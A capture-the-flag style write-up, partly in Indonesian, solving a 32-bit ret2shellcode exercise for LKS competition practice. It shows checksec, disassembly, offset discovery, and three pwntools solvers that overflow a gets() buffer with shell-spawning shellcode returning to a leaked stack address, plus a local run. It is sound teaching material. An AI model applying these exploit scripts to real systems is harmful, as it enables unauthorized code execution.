---
slug: "pwn-ret2shellcode"
title: "ret2shellcode"
competition: "Exercise"
category: "Pwn"
difficulty: "Easy"
date: "2026-08-18"
updated: "2026-08-24"
summary: "Latihan buat persiapan seleksi LKS, isinya ret2shellcode."
tags: ["PWN","ROP","HANDS-ON","EASY","X86","RET2SHELLCODE"]
status: "published"
flag: "SHELL"
attachments: []
source: "https://claritys.web.id/writeups/pwn-ret2shellcode"
---

# ret2shellcode

> Latihan buat persiapan seleksi LKS, isinya ret2shellcode.

Diawal, kita sudah diberi hint bahwa challenge ini itu ret2shellcode. Langsung saja kita checksec. Dan yup, kalau NX nya disabled itu 100% shellcode, tapi kalau unknown sih berdoa aja wkwk.

```bash
~/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2shellcode main*
❯ checksec cake_32                                                               󰥔 12:54:29
[*] '/home/claritys/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2shellcode/cake_32'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x8048000)
    Stack:      Executable
    RWX:        Has RWX segments
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

Luckily, its not stripped, lets check the function.

```bash
~/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2shellcode main*
❯ pwndbg cake_32                                                                 󰥔 12:58:20
ino GEF for linux ready, type `gef' to start, `gef config' to configure
93 commands loaded and 5 functions added for GDB 16.3 in 0.00ms using Python engine 3.13
pwndbg: loaded 212 pwndbg commands. Type pwndbg [filter] for a list.
pwndbg: created 13 GDB functions (can be used with print/break). Type help function to see them.
Reading symbols from cake_32...

This GDB supports auto-downloading debuginfo from the following URLs:
  <https://debuginfod.cachyos.org>
  <https://debuginfod.archlinux.org>
Debuginfod has been disabled.
To make this setting permanent, add 'set debuginfod enabled off' to .gdbinit.
(No debugging symbols found in cake_32)
gef➤  info fun
All defined functions:

Non-debugging symbols:
0x08049000  _init
0x08049090  printf@plt
0x080490a0  gets@plt
0x080490b0  puts@plt
0x080490c0  __libc_start_main@plt
0x080490d0  setvbuf@plt
0x080490e0  _start
0x08049120  _dl_relocate_static_pie
0x08049130  __x86.get_pc_thunk.bx
0x08049140  deregister_tm_clones
0x08049180  register_tm_clones
0x080491c0  __do_global_dtors_aux
0x080491f0  frame_dummy
0x080491f6  init
0x08049240  kue_leaker
0x080492d2  main
0x080492f7  __x86.get_pc_thunk.ax
0x08049300  __libc_csu_init
0x08049370  __libc_csu_fini
0x08049375  __x86.get_pc_thunk.bp
0x0804937c  _fini
```

Because there’s a function that kue\_leaker, usually i assume that is the vuln, so i don’t check the main. Because usually its just call the vuln.

```
gef➤  disas kue_leaker
Dump of assembler code for function kue_leaker:
   0x08049240 <+0>:     endbr32
   0x08049244 <+4>:     push   ebp
   0x08049245 <+5>:     mov    ebp,esp
   0x08049247 <+7>:     push   ebx
   0x08049248 <+8>:     sub    esp,0x84
   0x0804924e <+14>:    call   0x8049130 <__x86.get_pc_thunk.bx>
   0x08049253 <+19>:    add    ebx,0x2dad
   0x08049259 <+25>:    sub    esp,0xc
   0x0804925c <+28>:    lea    eax,[ebx-0x1ff8]
   0x08049262 <+34>:    push   eax
   0x08049263 <+35>:    call   0x80490b0 <puts@plt>
   0x08049268 <+40>:    add    esp,0x10
   0x0804926b <+43>:    sub    esp,0xc
   0x0804926e <+46>:    lea    eax,[ebx-0x1fb4]
   0x08049274 <+52>:    push   eax
   0x08049275 <+53>:    call   0x80490b0 <puts@plt>
   0x0804927a <+58>:    add    esp,0x10
   0x0804927d <+61>:    sub    esp,0x8
   0x08049280 <+64>:    lea    eax,[ebp-0x88]
   0x08049286 <+70>:    push   eax
   0x08049287 <+71>:    lea    eax,[ebx-0x1f66]
   0x0804928d <+77>:    push   eax
   0x0804928e <+78>:    call   0x8049090 <printf@plt>
   0x08049293 <+83>:    add    esp,0x10
   0x08049296 <+86>:    sub    esp,0xc
   0x08049299 <+89>:    lea    eax,[ebx-0x1f4c]
   0x0804929f <+95>:    push   eax
   0x080492a0 <+96>:    call   0x8049090 <printf@plt>
   0x080492a5 <+101>:   add    esp,0x10
   0x080492a8 <+104>:   sub    esp,0xc
   0x080492ab <+107>:   lea    eax,[ebp-0x88]
   0x080492b1 <+113>:   push   eax
   0x080492b2 <+114>:   call   0x80490a0 <gets@plt>
   0x080492b7 <+119>:   add    esp,0x10
   0x080492ba <+122>:   sub    esp,0xc
   0x080492bd <+125>:   lea    eax,[ebx-0x1ee8]
   0x080492c3 <+131>:   push   eax
   0x080492c4 <+132>:   call   0x80490b0 <puts@plt>
   0x080492c9 <+137>:   add    esp,0x10
   0x080492cc <+140>:   nop
   0x080492cd <+141>:   mov    ebx,DWORD PTR [ebp-0x4]
   0x080492d0 <+144>:   leave
   0x080492d1 <+145>:   ret
End of assembler dump.
```

Okay, there’s gets. and 0x88 = 136, because its x86, we need 140 for reaching EIP. And now we verification for the offset for the EIP.

```
>>> 0x88
136
>>> 0x88 + 4
140
```

```
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x1f
$ebx   : 0x62616169 ("iaab"?)
$ecx   : 0xf7f7b888  →  0x00000000
$edx   : 0xf7f7b888  →  0x00000000
$esp   : 0xffffd1e0  →  "laabma"
$ebp   : 0x6261616a ("jaab"?)
$esi   : 0xf7f79e2c  →  0x00292d4c ("L-)"?)
$edi   : 0x08049300  →  <__libc_csu_init+0000> endbr32
$eip   : 0x6261616b ("kaab"?)
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
──────────────────────────────────────────────────────────────────────────────── stack ────
0xffffd1e0│+0x0000: "laabma"     ← $esp
0xffffd1e4│+0x0004: 0x0000616d ("ma"?)
0xffffd1e8│+0x0008: 0xf7ffcca0  →  0x00000000
0xffffd1ec│+0x000c: 0xf7d09ac0  →   add esp, 0x10
0xffffd1f0│+0x0010: 0x00000001
0xffffd1f4│+0x0014: 0xffffd2b4  →  0xffffd4b6  →  "/home/claritys/ctf/pwncheatsheet/learnfromLKS/Bina[...]"
0xffffd1f8│+0x0018: 0xffffd2bc  →  0xffffd516  →  "XDG_RUNTIME_DIR=/run/user/1000"
0xffffd1fc│+0x001c: 0x00000000
────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x6261616b
────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "cake_32", stopped 0x6261616b in ?? (), reason: SIGSEGV
──────────────────────────────────────────────────────────────────────────────── trace ────
───────────────────────────────────────────────────────────────────────────────────────────
gef➤  cyclic -l kaab
Finding cyclic pattern of 4 bytes: b'kaab' (hex: 0x6b616162)
Found at offset 140
gef➤
```

Nah, kalau untuk ret2shellcode itu biasanya bikin EIP itu mengarah ke leak tempat buffer awal kita. Jadinya kita tinggal ngasih [shellcraft.sh](http://shellcraft.sh) di awal terus nanti dikasih ljust biar lebih simple nanti payloadnya.

My own solver: (actually I’m using template from pwninit and then i modifed it a bit for my own environment)

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("cake_32_patched")

exe = context.binary
context.terminal = ["ghostty", "-e"]

gdbscript = """
set pagination off
set confirm off

break main
continue
"""

def conn():
    if args.GDB:
        r = process([elf.path])
        gdb.attach(r, gdbscript=gdbscript)
        return r

    if args.LOCAL:
        return process([elf.path])

    return remote("addr", 1337)

def main():
    r = conn()
    payload = asm(shellcraft.sh())
    payload = payload.ljust(140, b'A')
    # good luck pwning :)
    r.recvuntil("leaknya =")
    buffer_address = int(r.recvline().strip().strip(b'!'), 16)
    payload += p32(buffer_address)
    r.sendline(payload)
    r.interactive()

if __name__ == "__main__":
    main()
```

Nah, aku ini no AI tapi melihat solverku yang dulu. Saat sedang mengerjakan modules dari nightmares.

Reference:

```bash
❯ cat nightmare/modules/06-bof_shellcode/tamu19_pwn3/solve.py                                                                                                                    󰥔 13:02:56
#!/usr/bin/env python3

from pwn import *

elf = ELF("pwn3_patched")

context.binary = elf
context.terminal = ['ghostty', '-e']
context.arch = 'i386'
def conn():
    if args.LOCAL:
        r = process([elf.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r

def main():
    r = conn()
    shellcode =  asm(shellcraft.sh())
    payload = shellcode
    payload = payload.ljust(302, b'A') #jangan lupa kalau pakai ljust jangan pakai += di payloadnya
    # good luck pwning :)
    r.recvuntil("Take this, you might need it on your journey ")
    # Membersihkan spasi, enter, dan tanda seru, lalu konversi dengan basis 16
    buffer_address = int(r.recvline().strip().strip(b'!'), 16)

    payload += p32(buffer_address)
    r.sendline(payload)
    r.interactive()

if __name__ == "__main__":
    main()
```

Solver resmi dari latihan LKS nya adalah:

```python
from pwn import *

elf = context.binary = ELF('./cake_32')
p = process()

offset = 140

shell = asm(shellcraft.sh())

p.recvuntil(b'= ')

leak = int(p.recvline().strip(),16)

#payload = flat(shell, cyclic(96), leak)
payload = flat(shell.ljust(offset, b'A'), p32(leak))
p.sendlineafter(b'> ', payload)
p.interactive()
```

we can keep it and use it as a reference in the future.

Eh aku juga baru tau kalau bisa kayak gitu gara gara solver resmi dari latihan LKSnya, dia lebih singkat sama lebih simple.

**Implement:**

```bash
~/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2shellcode main*
❯ python3 solve.py LOCAL                                                         󰥔 13:20:24
[*] '/home/claritys/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2shellcode/cake_32_patched'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x8048000)
    Stack:      Executable
    RWX:        Has RWX segments
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[x] Starting local process '/home/claritys/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Ha[▁] Starting local process '/home/claritys/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Ha[+] on/ROP/ret2shellcode/cake_32_patched': pid 93236
/home/claritys/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2shellcode/solve.py:35: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.recvuntil("leaknya =")
[*] Switching to interactive mode
Lylera: Maka dari itu coba susun cara bagaiman dari leak ini dapat shell. Aku kasih kamu kertas

>
Lylera: Okee. Mari kita cobaa
$ ls
cake.zip  cake_32  cake_32.py  cake_32_patched  cake_64  cake_64.py  solve.py
```
